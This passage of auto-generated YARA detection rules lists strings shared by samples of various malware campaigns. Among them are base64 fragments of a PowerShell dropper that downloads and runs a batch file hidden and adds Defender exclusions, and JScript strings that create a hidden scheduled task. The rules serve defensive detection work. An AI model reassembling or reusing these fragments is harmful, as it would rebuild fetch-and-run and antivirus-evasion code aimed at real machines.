        $s8 = "Y':'Invalid\\x20operation\\x20exception\\x20flag.'" ascii
        $s9 = "uction\\x20is\\x20always\\x20atomic,\\x20regardless\\x20of\\x20use\\x20of\\x20the\\x20LOCK\\x20prefix.'" ascii
        $s10 = "0used\\x20with\\x20REPNE\\x20(REPNZ)\\x20prefix.'" ascii
        $s11 = "sed\\x20with\\x20REP\\x20(REPE/REPZ)\\x20prefix.'" ascii
    condition:
        filesize < 18936396 and 12 of them
}

rule Sightlines_tlsh_917741bc_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-917741bc"
        date = "2026-10-30"
        campaign = "tlsh-917741bc"
        family = ""
        hash = "44f8fcef8a604b2dc35820a20a174f93306c90489512db4d53a865f2199e6f20"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-917741bc.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "`BATCH=1 DOMAINS=bbc.com CURL_CMD=1 SKIP_DNSCHECK=1 /opt/zapret2/blockcheck2.sh`" ascii
        $s1 = "local idx_sni = array_field_search(tdis.handshake[TLS_HANDSHAKE_TYPE_CLIENT].dis.ext, \"type\", TLS_EX" ascii
        $s2 = "table.insert(tdis.handshake[TLS_HANDSHAKE_TYPE_CLIENT].dis.ext, 1, { type = TLS_EXT_SERVER_NAME, dis" ascii
        $s3 = "Replaces the `<HOSTLIST>` and `<HOSTLIST_NOAUTO>` markers in $1 depending on the [MODE_FILTER](#conf" ascii
        $s4 = "_UNREACH_ADDR<br>ICMP6_DST_UNREACH_NOPORT | number | icmpv6 code for destination unreachable | ipv6 " ascii
        $s5 = "- Checks based on [DESYNC_FWMARK](#config-file)." ascii
        $s6 = "  <summary><b>Example of parsing `https://user:pass@domain.com:12345/my_uri/script.php?a=1&b=3`</b><" ascii
        $s7 = "nft add rule inet ztest pre iifname $IFACE_WAN udp sport \"{$PORTS_UDP}\" ct reply packets 1-$MAX_PKT_" ascii
        $s8 = "- Checking by [DESYNC_FWMARK](#config-file)." ascii
        $s9 = "table.insert(tdis.handshake[TLS_HANDSHAKE_TYPE_CLIENT].dis.ext[idx_sni].dis.list, { name = \"example." ascii
        $s10 = "(Google), AS16509 (Amazon), AS16276 (OVH), AS24940 (Hetzner). Whitelisted ASNs: AS47541 (VK), AS3523" ascii
        $s11 = "You can locally override [config](#config-file) variables and apply `FW_EXTRA_POST` and `FW_EXTRA_PR" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_25c8de05_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-25c8de05"
        date = "2026-10-30"
        campaign = "tlsh-25c8de05"
        family = ""
        hash = "1366102fff4ae8ee4cf146aa0fe447a5a975bdb3d4dbb739a862ba1e986335a0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-25c8de05.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    foreach ($line in [System.IO.File]::ReadAllLines((Join-Path $PSScriptRoot 'targets.txt'))) {" ascii
        $s1 = "function Invoke-CurlBatch($Targets, [string]$PostFile, [int]$Width = 0) {" ascii
        $s2 = "    $conn = if ($ok.Count) { [math]::Round(($ok | Measure-Object -Property ConnMs -Average).Average)" ascii
        $s3 = "function Get-IpBlocked($Table, [int]$TimeoutMs = 3000) {" ascii
        $s4 = "function Format-Summary($S, [string]$Prefix = '', [switch]$NoName) {" ascii
        $s5 = "\"https://hyperion-cs.github.io/dpi-checkers/ru/tcp-16-20/suite.v2.json\"') $Script:Runtime 15" ascii
        $s6 = "        try { $items = ConvertFrom-Json ([System.IO.File]::ReadAllText($file, [System.Text.Encoding]" ascii
        $s7 = "function Get-RunSummary([string]$Id, [string]$Name, $Rows, $CleanBase) {" ascii
        $s8 = "' }) + @($strategies | ForEach-Object { New-Object PSObject -Property @{ Id = $_.Id; Name = $_.Name " ascii
        $s9 = ": ' + ((Get-RotationOrder $settings.alt 'general' | ForEach-Object { $_.Name }) -join ' > ')) Gray" ascii
        $s10 = "    Write-TextNoBom (Join-Path $Script:Runtime 'test-best.txt') ($best.Id + \"`r`n\")" ascii
        $s11 = "param([int]$TimeoutSec = 5, [int]$Parallel = 16, [int]$Rounds = 1, [switch]$NoPrompt, [switch]$Repor" ascii
    condition:
        filesize < 1048576 and 11 of them
}

rule Sightlines_imphash_3d74cd53_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-3d74cd53"
        date = "2026-10-30"
        campaign = "imphash-3d74cd53"
        family = ""
        hash = "56bb65dd4756314a643b270a77fe67f6b44219d7258ef5900fbc01618da3f76a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-3d74cd53.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "SkNCiB9Ow0KICRiYXRjaEV4ZWN1dGVkPSgkc2V0dGluZ3MuYWRtaW5ydW4gLWVxICR0cnVlKTsNCiBpZiAoLW5vdCAkYmF0Y2hFe" ascii
        $s1 = "W5ncy5hZG1pbnJ1bj0kdHJ1ZTsNCiAgICAgJGJhdGNoRmlsZVBhdGg9IiRlbnY6QXBwRGF0YVwkcmFuZG9tU3RyaW5nLmJhdCI7D" ascii
        $s2 = "y1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cHM6Ly9naXRodWIuY29tL3Rob21zb24xMDEvd" ascii
        $s3 = "G9tc29uMTAxL3Rob21zb24xMDEvcmVsZWFzZXMvZG93bmxvYWQvUm9sZS9zb3VyY2UuYmF0JywgJGJhdGNoRmlsZVBhdGgpOw0KI" ascii
        $s4 = "QogICAgIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJ2h0dHBzOi8vZ2l0aHViLmNvbS90a" ascii
        $s5 = "F06OkdldFJhbmRvbUZpbGVOYW1lKCkuUmVwbGFjZSgiLiIsICIiKTsNCiBpZiAoJHNldHRpbmdzLldEKSB7DQogICAgICRzZXR0a" ascii
        $s6 = "W5ncz0oJ3sgIldEIjogZmFsc2UsICJhZG1pbnJ1biI6IGZhbHNlIH0nIHwgQ29udmVydEZyb20tSnNvbik7DQogJGV4Y2x1c2lvb" ascii
        $s7 = "GVjdXRlZCkgew0KICAgICAkYmF0Y2hGaWxlUGF0aD0iJGVudjpBcHBEYXRhXCRyYW5kb21TdHJpbmcuYmF0IjsNCiAgICAgKE5ld" ascii
        $s8 = "GhvbXNvbjEwMS9yZWxlYXNlcy9kb3dubG9hZC9Sb2xlL3NvdXJjZS5iYXQnLCAkYmF0Y2hGaWxlUGF0aCk7DQogICAgIFN0YXJ0L" ascii
        $s9 = "VByb2Nlc3MgLUZpbGVQYXRoICRiYXRjaEZpbGVQYXRoIC1XaW5kb3dTdHlsZSBIaWRkZW4gLVdhaXQgLVZlcmIgUnVuQXMNCiB9O" ascii
        $s10 = "U1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAkb3V0cHV0UGF0aDsNCiAkcmFuZG9tU3RyaW5nPVtTeXN0ZW0uSU8uUGF0a" ascii
        $s11 = "lBhdGg9JGVudjpBcHBEYXRhOw0KIEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJGV4Y2x1c2lvblBhdGg7DQogQWRkL" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_9ae30148_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9ae30148"
        date = "2026-10-31"
        campaign = "tlsh-9ae30148"
        family = ""
        hash = "25e39a89addddcfb96273f38cf4e14c875af352e0942f8875c83bedc1e32a11c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9ae30148.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".?AV?$_Func_impl_no_alloc@V<lambda_61b2317f6430986828c5b35896871436>@@XV?$shared_ptr@VClientHandlers" ascii
        $s1 = ".?AV?$_Func_impl_no_alloc@V<lambda_7d83b46dd0fcc695f3dff9759f1ae07a>@@PEAVRemoteQueryCallback@@H@std" ascii
        $s2 = ".?AV?$_Func_impl_no_alloc@V<lambda_b0ebd6983860228fff115410717f8a19>@@XV?$shared_ptr@VClientHandlers" ascii
        $s3 = ".?AV?$_Func_impl_no_alloc@V<lambda_09048d3a54f35910f3c676e261b15d6a>@@XV?$shared_ptr@VClientHandlers" ascii
        $s4 = ".?AV?$_Func_impl_no_alloc@V<lambda_006c2cff32bc3657877dbd6bab59e996>@@PEAVRemoteMessageRouter@@H@std" ascii
        $s5 = ".?AV?$_Func_impl_no_alloc@V<lambda_86aec3f2b56658c074fdaef7f1198610>@@XV?$shared_ptr@VClientHandlers" ascii
        $s6 = ".?AV?$_Func_impl_no_alloc@V<lambda_6f130847b96f25fd1f764f267224ab45>@@_NV?$shared_ptr@VClientHandler" ascii
        $s7 = ".?AV?$_Func_impl_no_alloc@V<lambda_4779a9f73928e4b1d19d65b06aea6c05>@@XV?$shared_ptr@VClientHandlers" ascii
        $s8 = ".?AV?$_Func_impl_no_alloc@V<lambda_46d7906b75a1c2c90fdf31e65516c09b>@@XV?$shared_ptr@VClientHandlers" ascii
        $s9 = ".?AV?$_Func_impl_no_alloc@V<lambda_78d3158004fee029a86853bb048411a0>@@XV?$shared_ptr@VClientHandlers" ascii
        $s10 = ".?AV?$_Func_impl_no_alloc@V<lambda_9969d70b162ac576d641a3c92c827bf7>@@XV?$shared_ptr@VClientHandlers" ascii
        $s11 = ".?AV?$_Func_impl_no_alloc@V<lambda_286c8b9f991e730d797e4548b77e10d4>@@_NV?$shared_ptr@VClientHandler" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3256320 and 12 of them
}

rule Sightlines_tlsh_acc41f66_prometei
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-acc41f66"
        date = "2026-10-30"
        campaign = "tlsh-acc41f66"
        family = "prometei"
        hash = "aa39b28aa15bfb60099a0a9421529fda51426415443da2cbb9fc567a45375f08"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-acc41f66.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.24 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = ".ab'Wr%Wcde%Wr%fgr%WrhijWr%Wklm%Wr%nor%WrpqrWr%Wstu%Wr%vwr%WrxyzWr%WABC%Wr%DEr%WrFGHWr%WIJK%Wr%LMr%W" ascii
        $s3 = "NQRSTNNNNUVWXNNNNYZ[\\NNNN]^_`NNNNabcdNNNNefghNNNNijklNNNNmnopNNNNqrstNNNNuvwxNNNNyz{|NNNN}~" ascii
        $s4 = "9QRST9999VWXY9999Z[\\]9999^_`a9999bcde9999fghi9999jklm9999nopq9999rstu9999vwxy9999z{|}9999~" ascii
        $s5 = " 9999!\"#$9999%&'(9999)*+,9999-./0999912349999567899999:;<9999=>?@9999ABCD9999EFGH9999IJKL9999MNOP999" ascii
        $s6 = " NNNN!\"#$NNNN%&'(NNNN)*+,NNNN-./0NNNN1234NNNN5678NNNN9:;<NNNN=>?@NNNNABCDNNNNEFGHNNNNIJKLNNNNMNOPNNN" ascii
        $s7 = " rrrr\"$%&rrrr/567rrrr9:<DrrrrGHI_rrrr`abczrrr" ascii
        $s8 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s9 = "w`GtvRsdC7PYqIEXKfs@7" ascii
        $s10 = "GCC: (Ubuntu 9.3.0-17u" ascii
        $s11 = "rNOPWr%WQRS%Wr%TUr%WrVWX" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_mutex_409c8fd9_winosstager
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign mutex-409c8fd9"
        date = "2026-10-31"
        campaign = "mutex-409c8fd9"
        family = "winosstager"
        hash = "3f3e8aed1a5bb4c86420bc0157df63f6c4ece52725dd8e5684155cbb57d6f012"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/mutex-409c8fd9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "nolmjkhifgdebc`a~" ascii
        $s1 = "NtQueryObject" ascii
        $s2 = "WINSPOOL.DRV" ascii
        $s3 = "RegEnumKeyW" ascii
        $s4 = "MSIMG32.dll" ascii
        $s5 = "joyGetPos" ascii
        $s6 = "nf~vNF^V" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 20505600 and 7 of them
}

rule Sightlines_tlsh_52d7e317_ladvix
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-52d7e317"
        date = "2026-10-30"
        campaign = "tlsh-52d7e317"
        family = "ladvix"
        hash = "1d94062fd82c36d43a64f0a9f1329c816fafecfaa70b2ddd8ae78364fc8da1fa"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-52d7e317.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/lib64/ld-linux-x86-64.so.2" ascii
        $s1 = "_ITM_deregisterTMCloneTable" ascii
        $s2 = "_ITM_registerTMCloneTable" ascii
        $s3 = "__libc_start_main" ascii
        $s4 = "__errno_location" ascii
        $s5 = "__stack_chk_fail" ascii
        $s6 = "__cxa_finalize" ascii
        $s7 = "__gmon_start__" ascii
        $s8 = "__strcpy_chk" ascii
        $s9 = "GLIBC_2.3.4" ascii
        $s10 = "__stpcpy_chk" ascii
        $s11 = "GLIBC_2.2.5" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_56a64d8a_ladvix
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-56a64d8a"
        date = "2026-10-30"
        campaign = "tlsh-56a64d8a"
        family = "ladvix"
        hash = "0062a03920d4a033a59c27f1d780dfd809781e57d3ff7b9585b062f3e4a53f76"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-56a64d8a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/lib64/ld-linux-x86-64.so.2" ascii
        $s1 = "_ITM_deregisterTMCloneTable" ascii
        $s2 = "_ITM_registerTMCloneTable" ascii
        $s3 = "Ym9uZ3JpcHo0amV6dXoK" ascii
        $s4 = "__libc_start_main" ascii
        $s5 = "__errno_location" ascii
        $s6 = "__stack_chk_fail" ascii
        $s7 = "__cxa_finalize" ascii
        $s8 = "__gmon_start__" ascii
        $s9 = "__strcpy_chk" ascii
        $s10 = "GLIBC_2.3.4" ascii
        $s11 = "__stpcpy_chk" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_6fe407d5_blankstealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-6fe407d5"
        date = "2026-10-30"
        campaign = "imphash-6fe407d5"
        family = "blankstealer"
        hash = "137790133dce2c6c56dcaee4b5551e135747de32008b2c6919fd51c5424b6bfa"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-6fe407d5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "_PYI_APPLICATION_HOME_DIR environment variable is not defined!" ascii
        $s1 = "Failed to set _PYI_PARENT_PROCESS_LEVEL environment variable!" ascii
        $s2 = " inflate 1.3.2 Copyright 1995-2026 Mark Adler " ascii
        $s3 = "Security descriptor string length exceeds PYI_PATH_MAX!" wide
        $s4 = "Could not allocate memory for SPLASH_CONTEXT." ascii
        $s5 = "SPLASH: length of Tk shared library path exceeds maximum path length!" ascii
        $s6 = "Invalid value in _PYI_PARENT_PROCESS_LEVEL: %s" ascii
        $s7 = "SPLASH: length of Tk module directory path exceeds maximum path length!" ascii
        $s8 = "Could not allocate memory for DYLIB_PYTHON structure." ascii
        $s9 = "SPLASH: length of Tcl shared library path exceeds maximum path length!" ascii
        $s10 = "SPLASH: length of Tcl module directory path exceeds maximum path length!" ascii
        $s11 = "Could not side-load PyInstaller's PKG archive from external file (%s)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 20912976 and 12 of them
}

rule Sightlines_tlsh_d1ed9b44_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d1ed9b44"
        date = "2026-10-30"
        campaign = "tlsh-d1ed9b44"
        family = ""
        hash = "78dfc6f96c6edb5c5c2aff3fb7dc04a70eba4dd4d2f794122f11ccc1012ac949"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d1ed9b44.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    def update_domains_list(self, domains_list: List[str]) -> None:" ascii
        $s1 = "    def get_domains_for_dc(self, dc_id: int) -> Iterator[str]:" ascii
        $s2 = "    def update_domain_for_dc(self, dc_id: int, domain: str) -> bool:" ascii
        $s3 = "        if Counter(self.domains) == Counter(domains_list):" ascii
        $s4 = "        current_domain = self._dc_to_domain.get(dc_id)" ascii
        $s5 = "        random.shuffle(shuffled_domains)" ascii
        $s6 = "from typing import Dict, List, Iterator " ascii
        $s7 = "        shuffled_domains = self.domains[:]" ascii
        $s8 = "        for domain in shuffled_domains:" ascii
        $s9 = "        if current_domain is not None:" ascii
        $s10 = "from collections import Counter" ascii
        $s11 = "balancer = _Balancer()" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_b2c2696f_lxbaserat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b2c2696f"
        date = "2026-10-31"
        campaign = "tlsh-b2c2696f"
        family = "lxbaserat"
        hash = "48c873b27f253c7dc5a0b270bcd183f41dbcdcb3889e2f10e46d7ea22c043074"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b2c2696f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        var appData = shell.ExpandEnvironmentStrings(\"%LOCALAPPDATA%\");" ascii
        $s1 = "        var xmlPath = shell.ExpandEnvironmentStrings(\"%TEMP%\") + \"\\\\\" + Math.floor(Math.random() * 9" ascii
        $s2 = "            \"<Task version=\\\"1.2\\\" xmlns=\\\"http://schemas.microsoft.com/windows/2004/02/mit/task\\\">\"" ascii
        $s3 = "        var net = WScript.CreateObject(String.fromCharCode(87,83,99,114,105,112,116,46,78,101,116,11" ascii
        $s4 = "var fso   = new ActiveXObject(_axOpen.fsoName);" ascii
        $s5 = "        var tmpRoot = shell.ExpandEnvironmentStrings(\"%TEMP%\");" ascii
        $s6 = "            \"<Principals><Principal id=\\\"Author\\\"><UserId>\" + userAccount + \"</UserId><LogonType>Int" ascii
        $s7 = "var shell = new ActiveXObject(_axOpen.shellName);" ascii
        $s8 = "//  Generates outLen bytes from (masterKey, salt, info) using ChaCha20 blocks." ascii
        $s9 = "            \"<Settings><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><DisallowStartIfOnBatteries>fals" ascii
        $s10 = "esPolicy>IgnoreNew</MultipleInstancesPolicy><Enabled>true</Enabled><Hidden>true</Hidden></Settings>\"" ascii
        $s11 = "    var pB = String.fromCharCode(87,83,99,114,105,112,116,46,83,104,101,108,108);" ascii
    condition:
        filesize < 3980942 and 12 of them
}

rule Sightlines_tlsh_b3b7e2b9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b3b7e2b9"
        date = "2026-10-31"
        campaign = "tlsh-b3b7e2b9"
        family = ""
        hash = "53fa8b6f2de4ec77d31f9ae1cd780366a9fdb95d7552ceb55c1bcd7f381e173c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b3b7e2b9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "@AB:ABCeBCDrCDEuDEFlEFGiFGHaGHIfHIJ IJKeJKLmKLMiLMNtMNOnNOPuOPQrPQR QRS4RST6STUwTUV-UVWwVWXgWXYnXYZi" ascii
        $s1 = "9:;l:;<l;<=d<=>.=>?0>?@-?@A1@AB-ABC1BCDlCDE-DEFpEFGaFGHeGHIhHIJ-IJKtJKLrKLMcLMN-MNOnNOPiOPQwPQR-QRSs" ascii
        $s2 = "BCD)CDESDEFSEFGOFGHLGHIPHIJ(IJK JKLeKLMcLMNnMNOaNOPcOPQiPQRfQRSiRSTnSTUgTUViUVWsVWX WXYfXYZoYZ[ Z[\\s" ascii
        $s3 = "QRS.RSTdSTU%TUV UVWnVWXoWXYiXYZsYZ[rZ[\\e[\\]v\\]^ ]^_l^_`o_`ac`aboabctbcdocderdefpefg fghnghiohijiijkt" ascii
        $s4 = "IJKvJKLgKLMrLMNaMNO_NOPwOPQoPQRrQRSrRSTaSTUnTUV_UVWeVWXrWXYuXYZgYZ[iZ[\\f[\\]n\\]^o]^_c^_`__`a" ascii
        $s5 = "ghi)hijWijkOjklLklmFlmnRmnoEnopVopqOpqr(qrs rstrstuotuvruvwrvwxewxy xyzeyz{gz{|n{|}a|}~r}~" ascii
        $s6 = "567k678r789o89:W9:;l:;<o;<=o<=>p=>?d>?@a?@Ae@ABrABChBCDTCDEeDEFtEFGaFGHeGHIrHIJCIJK" ascii
        $s7 = "XYZlYZ[lZ[\\d[\\].\\]^0]^_-^_`1_`a-`ab1abclbcd-cdeedeflefgafghcghiohijlijk-jkltklmrlmncmno-nopnopqipqrw" ascii
        $s8 = "LMNkMNOrNOPoOPQWPQRlQRSoRSToSTUpTUVdUVWaVWXeWXYrXYZhYZ[TZ[\\e[\\]s\\]^o]^_l^_`C_`a" ascii
        $s9 = "[\\]x\\]^%]^_x^_`0_`a `abeabcdbcdocdecdef efghfghtghiihijwijk jkldklmelmnlmnoinopaopqfpqr qrstrstcstue" ascii
        $s10 = "./0A/01x012E123w234o345d456n567i678W789e89:t9:;a:;<e;<=r<=>C=>?" ascii
        $s11 = "@ABdABCuBCDeCDEsDEFpEFG FGHnGHIwHIJoIJKnJKLkKLMnLMNUMNO NOP OPQ" ascii
    condition:
        filesize < 11432960 and 12 of them
}

rule Sightlines_tlsh_a5943fe6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a5943fe6"
        date = "2026-10-30"
        campaign = "tlsh-a5943fe6"
        family = ""
        hash = "050084563e794755872cfe70b99a7654292674fbcf4a6dd11fdc7f2547af233c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a5943fe6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "?_LogWorkItemCompleted@_TaskEventLogger@details@Concurrency@@QEAAXXZ" ascii
        $s1 = "?_Makeushloc@_Locimp@locale@std@@CAXAEBV_Locinfo@3@HPEAV123@PEBV23@@Z" ascii
        $s2 = "?_LogTaskExecutionCompleted@_TaskEventLogger@details@Concurrency@@QEAAXXZ" ascii
        $s3 = "?_IsNonBlockingThread@_Task_impl_base@details@Concurrency@@SA_NXZ" ascii
        $s4 = "?_LogScheduleTask@_TaskEventLogger@details@Concurrency@@QEAAX_N@Z" ascii
        $s5 = "?_LogWorkItemStarted@_TaskEventLogger@details@Concurrency@@QEAAXXZ" ascii
        $s6 = "?_LogTaskCompleted@_TaskEventLogger@details@Concurrency@@QEAAXXZ" ascii
        $s7 = "aAbBcCdDeFgGhHIjmMnprRStTuUVwWxXyYzZ" ascii
        $s8 = "?_CallInContext@_ContextCallback@details@Concurrency@@QEBAXV?$function@$$A6AXXZ@std@@_N@Z" ascii
        $s9 = "?_Makewloc@_Locimp@locale@std@@CAXAEBV_Locinfo@3@HPEAV123@PEBV23@@Z" ascii
        $s10 = "?_Makexloc@_Locimp@locale@std@@CAXAEBV_Locinfo@3@HPEAV123@PEBV23@@Z" ascii
        $s11 = "?register_callback@ios_base@std@@QEAAXP6AXW4event@12@AEAV12@H@ZH@Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1171744 and 12 of them
}

rule Sightlines_imphash_b5a9528d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-b5a9528d"
        date = "2026-10-30"
        campaign = "imphash-b5a9528d"
        family = ""
        hash = "1f72ca72dae9ef8bc6f13cf87c205998befdc7ddc6fe5445c9333089368a05e7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-b5a9528d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "command line encoding conversion failure" ascii
        $s1 = "Windows original main args:" ascii
        $s2 = "OpenJDK Platform binary" wide
        $s3 = "http://www.eclipse.org/0" ascii
        $s4 = "JLI_InitArgProcessing" ascii
        $s5 = "_JAVA_LAUNCHER_DEBUG" ascii
        $s6 = "Eclipse Adoptium" wide
        $s7 = "JLI_GetStdArgc" ascii
        $s8 = "JLI_GetStdArgs" ascii
        $s9 = "380114235959Z0i1" ascii
        $s10 = "JLI_CmdToArgs" ascii
        $s11 = "360903235959Z0c1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 9 of them
}

rule Sightlines_imphash_dd85b31b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-dd85b31b"
        date = "2026-10-30"
        campaign = "imphash-dd85b31b"
        family = ""
        hash = "2c08e77f86b0953cffa505bdbe64e87ecb7c088db65d5acb9a2eee65a32565ef"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-dd85b31b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "(Press Retry to debug the application - JIT must be enabled)" ascii
        $s1 = "failure, see the Visual C++ documentation on asserts" ascii
        $s2 = "api-ms-win-core-kernel32-legacy-l1-1-1.dll" ascii
        $s3 = "api-ms-win-core-processthreads-l1-1-0.dll" ascii
        $s4 = "api-ms-win-core-processenvironment-l1-1-0.dll" ascii
        $s5 = "api-ms-win-core-errorhandling-l1-1-0.dll" ascii
        $s6 = "api-ms-win-core-processthreads-l1-1-1.dll" ascii
        $s7 = "api-ms-win-core-libraryloader-l1-1-0.dll" ascii
        $s8 = "Assertion failed: %Ts, file %Ts, line %d" ascii
        $s9 = "api-ms-win-core-localization-l1-2-0.dll" ascii
        $s10 = "For information on how your program can cause an assertion" ascii
        $s11 = "api-ms-win-core-interlocked-l1-1-0.dll" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2746656 and 12 of them
}

rule Sightlines_imphash_877b4cfc_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-877b4cfc"
        date = "2026-10-30"
        campaign = "imphash-877b4cfc"
        family = ""
        hash = "34b78a64d76e3d03455fa25dda4292eea59dea145f0c3f2c2addcb7380ff988b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-877b4cfc.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" ascii
        $s1 = "D:\\Projects\\WinRAR\\SFX\\build\\sfxrar64\\Release\\sfxrar.pdb" ascii
        $s2 = "<style>body{font-family:\"Arial\";font-size:12;}</style>" wide
        $s3 = "JNot enough memory to unpack the archive with %u GB compression dictionary.+64-bit self-extracting m" wide
        $s4 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">" ascii
        $s5 = "<html><head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\"></head>" wide
        $s6 = "    <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s7 = "<asmv3:application xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s8 = "manually.</li><br><br>8<li>If the destination folder does not exist, it will be2created automaticall" wide
        $s9 = "<description>WinRAR SFX module</description>" ascii
        $s10 = "    <!--The ID below indicates application support for Windows 10 -->" ascii
        $s11 = "    <!--The ID below indicates application support for Windows 7 -->" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 29383750 and 12 of them
}

rule Sightlines_rich_header_hash_765116da_guloader
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-765116da"
        date = "2026-10-30"
        campaign = "rich_header_hash-765116da"
        family = "guloader"
        hash = "27cb385ffdd96c18ac7bcfd42a121e5cc4b526da818a7e3694b72655e4d5142a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-765116da.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/><supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{35138b9a-5d96-4fbd-8e2" ascii
        $s1 = "d=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"" ascii
        $s2 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:as" ascii
        $s3 = "mbly></dependency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges" ascii
        $s4 = "m.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Null" ascii
        $s5 = "stInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><supportedOS I" ascii
        $s6 = "><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=" ascii
        $s7 = "d-a2440225f93a}\"/></application></compatibility></assembly>" ascii
